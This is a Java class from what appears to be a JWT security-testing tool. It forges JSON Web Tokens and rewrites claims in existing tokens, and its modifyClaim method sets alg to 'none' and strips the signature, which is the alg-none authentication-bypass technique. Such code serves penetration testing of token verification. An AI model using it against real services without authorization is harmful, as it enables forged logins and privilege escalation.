package com.bulletdev.jhasher.core.jwt;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.Type;
import java.nio.charset.StandardCharsets;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

public class JwtForger {

    private static final Gson GSON = new Gson();
    private static final Type MAP_TYPE = new TypeToken<LinkedHashMap<String, Object>>() {}.getType();
    private static final Base64.Encoder URL_ENCODER = Base64.getUrlEncoder().withoutPadding();
    private static final Base64.Decoder URL_DECODER = Base64.getUrlDecoder();

    private static final Map<String, String> ALG_TO_HMAC = Map.of(
            "HS256", "HmacSHA256",
            "HS384", "HmacSHA384",
            "HS512", "HmacSHA512"
    );

    /**
     * Forge a complete JWT with the given algorithm, payload, and signing key.
     */
    public String forge(String algorithm, String payloadJson, String key) {
        Map<String, Object> header = new LinkedHashMap<>();
        header.put("alg", algorithm);
        header.put("typ", "JWT");

        String headerEncoded = base64UrlEncode(GSON.toJson(header));
        String payloadEncoded = base64UrlEncode(payloadJson);
        String signingInput = headerEncoded + "." + payloadEncoded;

        String signature;
        if ("none".equalsIgnoreCase(algorithm)) {
            signature = "";
        } else if (ALG_TO_HMAC.containsKey(algorithm)) {
            signature = hmacSign(signingInput, key.getBytes(StandardCharsets.UTF_8), ALG_TO_HMAC.get(algorithm));
        } else {
            // Unsupported algorithm - return with empty signature
            signature = "";
        }

        return signingInput + "." + signature;
    }

    /**
     * Decode a token's payload, modify a single claim, and re-encode as an unsigned token.
     */
    public String modifyClaim(String token, String claimName, Object newValue) {
        String[] parts = token.split("\\.");
        if (parts.length < 2) {
            throw new IllegalArgumentException("Invalid JWT format");
        }

        // Decode header and payload
        Map<String, Object> header = decodeJsonPart(parts[0]);
        Map<String, Object> payload = decodeJsonPart(parts[1]);

        // Modify the claim
        payload.put(claimName, newValue);

        // Set alg to none since we cannot re-sign without the key
        header.put("alg", "none");

        String headerEncoded = base64UrlEncode(GSON.toJson(header));
        String payloadEncoded = base64UrlEncode(GSON.toJson(payload));

        return headerEncoded + "." + payloadEncoded + ".";
    }

    // --- Internal helpers exposed for use by JwtAttacker ---

    static String base64UrlEncode(String data) {
        return URL_ENCODER.encodeToString(data.getBytes(StandardCharsets.UTF_8));
    }

    static String base64UrlEncode(byte[] data) {
        return URL_ENCODER.encodeToString(data);
    }

    static String hmacSign(String input, byte[] keyBytes, String hmacAlgorithm) {
        try {
            Mac mac = Mac.getInstance(hmacAlgorithm);
            mac.init(new SecretKeySpec(keyBytes, hmacAlgorithm));
            byte[] signature = mac.doFinal(input.getBytes(StandardCharsets.UTF_8));
            return URL_ENCODER.encodeToString(signature);
        } catch (NoSuchAlgorithmException | InvalidKeyException e) {
            return "";
        }
    }

    private Map<String, Object> decodeJsonPart(String base64Part) {
        String padded = padBase64(base64Part);
        byte[] decoded = URL_DECODER.decode(padded);
        String json = new String(decoded, StandardCharsets.UTF_8);
        return GSON.fromJson(json, MAP_TYPE);
    }

    private String padBase64(String base64) {
        int remainder = base64.length() % 4;
        if (remainder == 2) {
            return base64 + "==";
        } else if (remainder == 3) {
            return base64 + "=";
        }
        return base64;
    }
}
